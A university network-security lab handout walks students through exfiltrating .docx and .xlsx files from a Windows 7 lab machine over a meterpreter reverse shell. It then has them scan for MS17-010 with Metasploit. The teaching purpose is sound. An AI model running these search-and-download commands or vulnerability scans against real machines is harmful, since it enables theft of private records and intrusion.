---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Data Exfiltration

## Discussion

Data exfiltration is particularly problematic because the amount of data that can be obtained could be significant. There have been attacks where Terabytes of data had been stolen and it was never detected until the organization was contacted by law enforcement or the data was publicly exposed. As you perform the attack in this lab, think of it happening to a medical facility where you and your family receive treatment, to Champlain College, or a bank. Think of the types of information you’ve provided to your hospital, Dr’s office, Champlain, or a bank.

## Preparation

* Ensure your firewall, Windows 7, and Kali system are on.
* Kali must be on the NETSEC-WAN segment
* Switch to your WIndows 7 system.and open Internet Explorer (Start menu and type “iexplore”)
* Browse to Google and search for Google Chrome.
* Download Google Chrome and install it.
* Open Google Chrome and browse to the URL: https://tinyurl.com/5y2e8xxe
* Download the zip file:
* Extract the files to the “Documents” folder for ‘joker.’

## Start the Attack

**Work individually or with your partner.**

Login to your Kali system and perform the attack to [obtain a reverse shell on Windows 7.](https://docs.google.com/document/u/0/d/1H-UP20kA2V46aPtNbcMP4iHkW8g5\_876y2nYlzmh-0w/edit)

**NOTE: You should already have the WinSCP file in your Downloads folder, so you only need to start the listener on Kali and once it is running, execute the WinSCP program.**

At the meterpreter prompt, type:

search -f \*.docx

The command searches for files ending with \*.docx. Wait to see if there are any results. If not, search for \*.xlsx files

Note the output of files. To exfil those files use the “Download” command.

download ‘PATH\_TO\_FILE’

You have to add the single quotes around the file name. Download each of the files to your Kali workstation.

Type the command “ls” on your Kali workstation to show the files were downloaded. Annotate the files highlighted.

NOTE: If obtaining those xlsx files was the attackers goal, the attack is over that quick.

**Submission: Take a screenshot of the files that were exfiltrated.**

**Complete the MRCI Lab under “Security Tools:” Use Metasploit To Identify A Machine Vulnerable To MS17-010**

Note that it mentions using the “auxiliary” module. Auxiliary modules within Metasploit are typically used for scanning or enumerating (finding information), but not to “exploit” a vulnerability. When you popped a shell on Windows XP, you used an “exploit” module. Accordingly, when you search for the MS17-010 module, then look for the ‘auxiliary’ modules. Try each one and be sure it meets the rubric for the lab. Use your mouse to highlight the expected text:

**Validation: You will see the message appear 'Host is LIKELY vulnerable to MS17-010!'**
